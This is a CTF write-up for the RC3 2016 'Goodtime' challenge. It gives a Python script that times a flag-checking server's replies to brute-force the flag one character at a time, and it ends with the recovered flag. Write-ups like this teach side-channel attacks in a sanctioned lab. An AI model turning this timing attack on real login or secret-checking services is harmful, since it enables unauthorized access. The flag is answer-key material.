#150 - Goodtime

>We were given a youtube [link](https://www.youtube.com/watch?v=H7HmzwI67ec) to the song Good Time by Owl City & Carly Rae Jepsen and `nc goodtime.ctf.rc3.club 5866`

#Solution

We were given a link to the song Good Time by Owl City & Carly Rae Jepsen and a server to netcat to. Lets try netcatting to the server.

`nc goodtime.ctf.rc3.club 5866`

We were greeted with a prompt to enter the flag. We try entering gibberish, but it just returns "Nope". Then since we know that all flags begin with `RC3-2016-` we try entering that. We notice that the server paused for a while then returns "Nope". This must be a timing attack! Now we just have to write a python script to brute force the flag based on the times.

```python
import socket, base64
import time
def call(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("goodtime.ctf.rc3.club", 5866))
    start = int(round(time.time() * 1000))
    data = repr(s.recv(1024))
    s.send(payload)
    data = repr(s.recv(1024))
    end = int(round(time.time() * 1000))
    s.shutdown(socket.SHUT_WR)
    s.close()
    
    return str(end - start) + "gugugu" + str(data)


flag = "RC3-2016-"
res = "60guguguNope\\n"
great = int(call(flag).split("gugugu")[0])
greatch = ""
charset = "abcdefghijklmnopqrstuvwxyz-_1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
charset2 = "!@#$%^&*()+=[]{}\|/;:<>,.?"
while ("Nope" in str(res.split("gugugu")[1])):
    for a in charset:
        res = call(flag + str(a))
        num = int(res.split("gugugu")[0])
        print str(num) + " " + a
        if (num > great):
            if (num - great > 150):
                print a
            great = num
            greatch = str(a)
    flag += greatch
    print flag
```

This program tests each character in the charset string and records the time it takes for the server to return a response. I found the threshold of time between each character to be 150-250 milliseconds, but since the server was buggy sometimes, I just iterated through the charset and used the character that had the longest response time. I later added charset2 after the program couldn't find a character that had a significant difference in time, which fixed that issue.
After having the program run for a while, and guessing words/letters in the flag, we finally get the flag when the server returns "Yup!"

#Flag

>RC3-2016-itz-alw4yz-a-g00d-t1m1ng-@tt@ck
